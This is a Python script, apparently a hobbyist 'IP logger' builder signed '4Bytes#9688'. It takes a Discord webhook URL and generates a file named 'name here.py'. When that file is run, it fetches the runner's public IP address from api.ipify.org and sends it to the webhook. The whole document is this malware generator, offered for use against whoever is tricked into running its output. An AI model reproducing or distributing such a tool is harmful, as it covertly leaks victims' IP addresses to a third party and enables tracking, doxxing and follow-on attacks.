print('''
Made by 4Bytes#9688
 ______   __________
|      | |    ___   \\
|      | |   |   |   |
|      | |   |___|   |
|      | |    _______/
|      | |    |      
|      | |    |
|      | |    |
|      | |    |
|______| |____| 

---------------------------------
''')
webhookpls = input("Enter your webhook URL: ")
cool = open("name here.py","w")
if cool != None:
    cool.write(f'''
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
something = get("https://api.ipify.org")
url = f"{webhookpls}"
webhooktime = DiscordWebhook(url=url,content="IP detected")
hi = webhooktime.execute()
webhooktime1 = DiscordEmbed(url=url,title="Info",description="IP: " + something.text,color=000000)
webhooktime.add_embed(webhooktime1)
hi2 = webhooktime.execute()
''')
    cool.close()
    print("IP logger edited! Check your current directory.")
else:
    okboomer = open("name here.py","a+")
    okboomer.write(f'''
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get
something = get("https://api.ipify.org")
url = f"{webhookpls}"
webhooktime = DiscordWebhook(url=url,content="IP detected")
hi = webhooktime.execute()
webhooktime1 = DiscordEmbed(url=url,title="Info",description="IP: " + something.text,color=000000)
webhooktime.add_embed(webhooktime1)
hi2 = webhooktime.execute()
''')
    okboomer.close()
    print("IP logger created! Check your current directory.")